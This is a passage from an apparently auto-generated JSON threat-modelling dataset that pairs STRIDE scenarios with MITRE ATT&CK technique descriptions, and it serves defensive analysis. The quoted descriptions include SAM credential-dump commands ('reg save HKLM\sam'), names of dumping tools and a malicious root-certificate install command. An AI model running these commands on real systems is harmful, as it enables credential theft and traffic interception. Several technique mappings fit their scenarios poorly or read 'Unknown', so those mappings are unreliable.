            "Scenario": "An attacker exploits a vulnerability in the AI/ML models to execute commands as a higher-privileged user.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models have exploitable vulnerabilities.",
                    "Role": "Defender",
                    "Condition": "Models are not securely developed or reviewed."
                },
                {
                    "Assumption": "The attacker has access to the input that can exploit the model.",
                    "Role": "Attacker",
                    "Condition": "Insufficient input validation and sanitization."
                }
            ],
            "Potential Impact": "Unauthorized execution of privileged commands and potential system takeover.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "AI/ML models",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Artificial Intelligence",
                "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI)\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI)\n",
                "id": "attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e",
                "technique_id": "T1588.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers gain unauthorized access to database admin credentials to elevate their privileges.",
            "Assumptions": [
                {
                    "Assumption": "Database credentials are not securely stored and managed.",
                    "Role": "Defender",
                    "Condition": "Weak credential storage mechanisms."
                },
                {
                    "Assumption": "User accounts do not have the principle of least privilege enforced.",
                    "Role": "Defender",
                    "Condition": "Excessive permissions granted to user accounts."
                }
            ],
            "Potential Impact": "Complete control over database resources, leading to data theft or manipulation.",
            "MITRE ATT&CK Keywords": [
                "database",
                "admin credentials",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Security Account Manager",
                "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
                "id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
                "technique_id": "T1003.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised smart card or hardware token grants higher privileges than intended.",
            "Assumptions": [
                {
                    "Assumption": "Hardware tokens or smart cards have exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Tokens/cards are not updated or hardened against attacks."
                },
                {
                    "Assumption": "Access control systems do not validate the privileges associated with the token/card.",
                    "Role": "Defender",
                    "Condition": "Insufficient validation and verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted areas or sensitive data.",
            "MITRE ATT&CK Keywords": [
                "hardware tokens",
                "smart cards",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Multi-Factor Authentication Interception",
                "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
                "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
                "technique_id": "T1111"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by spoofing the identity of an authorized user through weaknesses in biometric authentication mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is stored unencrypted in the system.",
                    "Role": "System Architect",
                    "Condition": "Biometric data not encrypted at rest."
                },
                {
                    "Assumption": "The attacker has access to a similar biometric sample of the target user.",
                    "Role": "Attacker",
                    "Condition": "Attacker can acquire the victim's biometric sample."
                },
                {
                    "Assumption": "Biometric matching algorithms do not perform extensive cross-checks.",
                    "Role": "Security Engineer",
                    "Condition": "Algorithm prioritizes speed over precision."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system functionality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric authentication",
                "identity theft",
                "access token manipulation"
            ],
            "mitre_technique": {
                "name": "Access Token Manipulation",
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
                "technique_id": "T1134"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering to trick a user into revealing their smart card, then clones the smart card for unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Users are not trained to recognize social engineering attacks.",
                    "Role": "Training Coordinator",
                    "Condition": "Lack of regular security training."
                },
                {
                    "Assumption": "Smart card cloning equipment is readily accessible to the attacker.",
                    "Role": "Attacker",
                    "Condition": "Availability of cloning devices."
                },
                {
                    "Assumption": "The system does not employ additional verification steps after smart card authentication.",
                    "Role": "System Architect",
                    "Condition": "Single-factor authentication using smart cards."
                }
            ],
            "Potential Impact": "Unauthorized system access and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "smart card cloning",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and uses a hardware token transmitted via wireless communication using a man-in-the-middle attack.",
            "Assumptions": [
                {
                    "Assumption": "Wireless communication between hardware token and system is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Unsecured wireless communication."
                },
                {
                    "Assumption": "The attacker has proximity to intercept wireless signals.",
                    "Role": "Attacker",
                    "Condition": "Physical access to the vicinity."
                },
                {
                    "Assumption": "No mutual authentication between hardware token and the system.",
                    "Role": "System Architect",
                    "Condition": "Lack of mutual authentication protocols."
                }
            ],
            "Potential Impact": "Unrestricted access to authorized users' credentials and subsequent system access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "hardware token",
                "wireless communication"
            ],
            "mitre_technique": {
                "name": "Multi-Factor Authentication Interception",
                "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
                "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
                "technique_id": "T1111"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious modification of sensor firmware to inject false data or disable sensors.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely signed or verified.",
                    "Role": "Firmware Developer",
                    "Condition": "Unsigned firmware updates."
                },
                {
                    "Assumption": "Attacker has physical access to the sensors.",
                    "Role": "Attacker",
                    "Condition": "Physical access to hardware."
                },
                {
                    "Assumption": "Lack of regular integrity checks on sensor data.",
                    "Role": "System Operator",
                    "Condition": "No integrity verification mechanisms in place."
                }
            ],
            "Potential Impact": "Corruption of sensor data leading to incorrect system responses.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "sensor injection",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Database tampering by exploiting vulnerable APIs to alter or delete user profiles and historical data.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack sufficient access controls and input validation.",
                    "Role": "API Developer",
                    "Condition": "Weak or missing input validation and access controls."
                },
                {
                    "Assumption": "System logs do not capture API call details comprehensively.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging of API activities."
                },
                {
                    "Assumption": "Database does not have role-based access controls finely tuned.",
                    "Role": "Database Administrator",
                    "Condition": "Overly permissive access control settings."
                }
            ],
            "Potential Impact": "Loss of data integrity and possible unavailability of crucial historical data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "API exploitation",
                "data alteration",
                "user profile manipulation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the communication infrastructure to inject false control commands to actuators, such as unlocking doors.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Plaintext communication over networks."
                },
                {
                    "Assumption": "Command messages are not authenticated.",
                    "Role": "System Architect",
                    "Condition": "Lack of message authentication mechanisms."
                },
                {
                    "Assumption": "The attacker can intercept and modify traffic due to insecure network configurations.",
                    "Role": "Network Administrator",
                    "Condition": "Vulnerable network configuration."
                }
            ],
            "Potential Impact": "Loss of control over physical security and safety mechanisms.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "command injection",
                "network traffic manipulation",
                "actuator control"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing a critical action such as changing system settings, exploiting weak or missing logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "System does not enforce comprehensive logging of user actions.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging settings."
                },
                {
                    "Assumption": "Logs are not synchronized with a secure time source.",
                    "Role": "System Architect",
                    "Condition": "Lack of time synchronization."
                },
                {
                    "Assumption": "Logs lack integrity checks which enable tampering.",
                    "Role": "Security Engineer",
                    "Condition": "Logs can be tampered without detection."
                }
            ],
            "Potential Impact": "Challenges in auditing, tracking, and attributing malicious or erroneous actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log omission",
                "log tampering",
                "non-repudiation failure"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates system logs to cover tracks after unauthorized access or malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Logging system is not tamper-proof.",
                    "Role": "Security Engineer",
                    "Condition": "Logs can be altered or deleted."
                },
                {
                    "Assumption": "System logs are stored locally without redundancy.",
                    "Role": "System Administrator",
                    "Condition": "No remote log storage or backup."
                },
                {
                    "Assumption": "Lack of real-time monitoring and alerting on log changes.",
                    "Role": "Network Operations Center (NOC)",
                    "Condition": "No active monitoring of log integrity."
                }
            ],
            "Potential Impact": "Difficulty in forensic analysis and delayed response to potential security incidents.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "track covering",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0000cdd5-1fb7-40bd-9324-a276c81318c7",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending commands or transactions which lack comprehensive verifiable records, exploiting weaknesses in transaction non-repudiation mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "System does not provide cryptographically verifiable records of user actions.",
                    "Role": "System Architect",
                    "Condition": "Lack of cryptographic signing of transactions."
                },
                {
                    "Assumption": "Communication between subsystems is not logged adequately.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient inter-component communication logging."
                },
                {
                    "Assumption": "Logs are not stored in an immutable manner.",
                    "Role": "Database Administrator",
                    "Condition": "Logs can be modified or deleted."
                }
            ],
            "Potential Impact": "Issues in dispute resolution and auditing of user actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "transaction denial",
                "cryptographic verification",
                "audit log immutability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data stored in data repositories due to insufficient access controls and encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data is stored in plaintext without encryption.",
                    "Role": "Data Engineer",
                    "Condition": "Unencrypted sensitive data."
                },
                {
                    "Assumption": "Access controls are not fined-grained or role-based.",
                    "Role": "Database Administrator",
                    "Condition": "Overly permissive access controls."
                },
                {
                    "Assumption": "There is no monitoring of access patterns to detect anomalies.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Sensitive data leaks leading to compliance violations and loss of user trust.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control bypass",
                "data leak",
                "unencrypted storage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of data during transmission via man-in-the-middle attacks due to lack of encryption and weak authentication.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted over the network is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Unencrypted data transmission."
                },
                {
                    "Assumption": "Endpoints do not authenticate properly before data exchange.",
                    "Role": "System Architect",
                    "Condition": "Lack of endpoint authentication."
                },
                {
                    "Assumption": "Network does not have defenses against MITM attacks.",
                    "Role": "Security Engineer",
                    "Condition": "Absence of MITM protection."
                }
            ],
            "Potential Impact": "Exposure of sensitive information and potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "man-in-the-middle",
                "unencrypted transmission",
                "weak authentication"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to AI/ML model parameters and training data, leading to potential misuse or exploitation.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML model storage and training data are not adequately secured.",
                    "Role": "AI Engineer",
                    "Condition": "Insecure storage of models and data."
                },
                {
                    "Assumption": "Access controls do not restrict access to model parameters.",
                    "Role": "System Architect",
                    "Condition": "Permissive access settings on AI/ML resources."
                },
                {
                    "Assumption": "There is no monitoring or alerting on access to sensitive AI resources.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of AI resource access monitoring."
                }
            ],
            "Potential Impact": "Compromise of proprietary algorithms and misuse of sensitive training data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "AI/ML model theft",
                "training data exposure",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic, overwhelming the communication infrastructure and causing a service outage.",
            "Assumptions": [
